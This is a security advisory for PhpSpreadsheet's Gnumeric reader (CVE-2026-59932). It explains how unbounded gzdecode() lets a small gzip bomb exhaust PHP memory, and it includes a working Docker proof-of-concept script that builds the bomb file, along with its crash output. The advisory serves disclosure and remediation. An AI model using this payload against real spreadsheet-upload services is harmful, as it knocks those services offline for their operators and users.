# [H] PHPSpreadsheet: Gnumeric reader unbounded gzip expansion causes memory exhaustion

## Summary
Severity: High
Advisory: GHSA-2mrg-gjxq-2gvr
CVE: CVE-2026-59932
CWE: CWE-400, CWE-409
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-07-23
Source: https://github.com/advisories/GHSA-2mrg-gjxq-2gvr
Type: github-advisory

## Affected
- Packagist: `phpoffice/phpspreadsheet` — affected >=4.0.0 <5.8.1
- Packagist: `phpoffice/phpspreadsheet` — affected >=3.3.0 <3.10.7
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.2.0 <2.4.7
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.0.0 <2.1.18
- Packagist: `phpoffice/phpspreadsheet` — affected >=0 <1.30.6

## Details
## Summary

PhpSpreadsheet's Gnumeric reader reads attacker-supplied `.gnumeric` files into memory and, when the file starts with gzip magic bytes, calls `gzdecode()` on the full compressed contents without enforcing a decompressed-size limit. A very small compressed `.gnumeric` file can expand to data larger than the PHP memory limit and crash the process during `Gnumeric::canRead()` before the file is rejected or fully parsed.

This is reachable through normal file-type detection and Gnumeric loading paths, so applications that accept attacker-controlled spreadsheet uploads can suffer denial of service.

## Vulnerability details

`Gnumeric::canRead()` invokes `gzfileGetContents()` before deciding whether the file is a valid Gnumeric spreadsheet:

- `src/PhpSpreadsheet/Reader/Gnumeric.php:80-90` calls `$this->gzfileGetContents($filename)` from `canRead()`.
- `src/PhpSpreadsheet/Reader/Gnumeric.php:105-115` calls `canRead()` and then reads the expanded contents again for worksheet-name listing.
- `src/PhpSpreadsheet/Reader/Gnumeric.php:253-265` calls `canRead()` and then reads the expanded contents again for full loading.

The vulnerable expansion is in `gzfileGetContents()`:

- `src/PhpSpreadsheet/Reader/Gnumeric.php:187-190` reads the entire input file into `$contents` with `file_get_contents()`.
- `src/PhpSpreadsheet/Reader/Gnumeric.php:192-197` detects gzip magic bytes and calls `gzdecode($contents)` without a decompressed-size cap.
- `src/PhpSpreadsheet/Reader/Gnumeric.php:204-205` scans the expanded data only after decompression has already completed.

Because decompression occurs before XML scanning or structural validation, a tiny gzip payload can force large memory allocation even if the resulting XML is meaningless or invalid.

## Impact

A small `.gnumeric` upload can crash a PHP worker during spreadsheet type detection or import. This can cause denial of service in web applications, queue workers, preview services, document converters, or any service that runs PhpSpreadsheet against untrusted spreadsheet files.

In the local reproduction below, a 97,811-byte file expands to about 96 MiB and crashes `Gnumeric::canRead()` under `memory_limit=64M` at `Reader/Gnumeric.php:195`.

## Safe local proof of concept

This proof of concept uses only Docker with `--network none`; it creates the compressed payload inside the container and does not contact external infrastructure.

```bash
docker run --rm --network none -i \
  -v /home/sondt23/Github/CVE/ares/github-repo/PhpSpreadsheet:/app \
  -w /app ghcr.io/typo3/core-testing-php82:1.15 sh <<'SH'
set -eu
php -r '
$prefix = "<?xml version=\"1.0\"?><gnm:Workbook xmlns:gnm=\"http://www.gnumeric.org/v10.dtd\">";
$suffix = "</gnm:Workbook>";
$payload = $prefix . str_repeat("A", 96 * 1024 * 1024) . $suffix;
$gz = gzencode($payload, 9);
file_put_contents("/tmp/bomb.gnumeric", $gz);
printf("compressed_size=%d expanded_size=%d\n", filesize("/tmp/bomb.gnumeric"), strlen($payload));
'
php -d memory_limit=64M -d display_errors=1 -r '
require "/app/vendor/autoload.php";
$r = new PhpOffice\PhpSpreadsheet\Reader\Gnumeric();
var_dump($r->canRead("/tmp/bomb.gnumeric"));
' 2>&1 || true
SH
```

Observed output:

```text
compressed_size=97811 expanded_size=100663390
PHP Fatal error:  Allowed memory size of 67108864 bytes exhausted (tried to allocate 50291378 bytes) in /app/src/PhpSpreadsheet/Reader/Gnumeric.php on line 195
PHP Stack trace:
PHP   1. {main}() Command line code:0
PHP   2. PhpOffice\PhpSpreadsheet\Reader\Gnumeric->canRead($filename = '/tmp/bomb.gnumeric') Command line code:4
PHP   3. PhpOffice\PhpSpreadsheet\Reader\Gnumeric->gzfileGetContents($filename = '/tmp/bomb.gnumeric') /app/src/PhpSpreadsheet/Reader/Gnumeric.php:84
PHP   4. gzdecode(...) /app/src/PhpSpreadsheet/Reader/Gnumeric.php:195
```

## Suggested remediation

- Do not decompress gzip data with unbounded `gzdecode()` for untrusted `.gnumeric` files.
- Stream decompression with a strict maximum output-size limit before allocating the full expanded XML.
- Enforce a configurable maximum compressed size and maximum decompressed size for Gnumeric files.
- Ensure `canRead()`, `listWorksheetNames()`, `listWorksheetInfo()`, and `load()` share bounded decompression logic and avoid decompressing the same file repeatedly.
- Fail closed with a recoverable `Reader\Exception` when limits are exceeded, rather than allowing a PHP fatal memory error.

## References
- https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-2mrg-gjxq-2gvr
- https://github.com/PHPOffice/PhpSpreadsheet/commit/85f2556b0bf5269061bf45932ecda8a128d81750
- https://github.com/PHPOffice/PhpSpreadsheet
- https://github.com/PHPOffice/PhpSpreadsheet/releases/tag/1.30.6
- https://github.com/PHPOffice/PhpSpreadsheet/releases/tag/2.1.18
- https://github.com/PHPOffice/PhpSpreadsheet/releases/tag/2.4.7
- https://github.com/PHPOffice/PhpSpreadsheet/releases/tag/3.10.7
- https://github.com/PHPOffice/PhpSpreadsheet/releases/tag/5.8.1
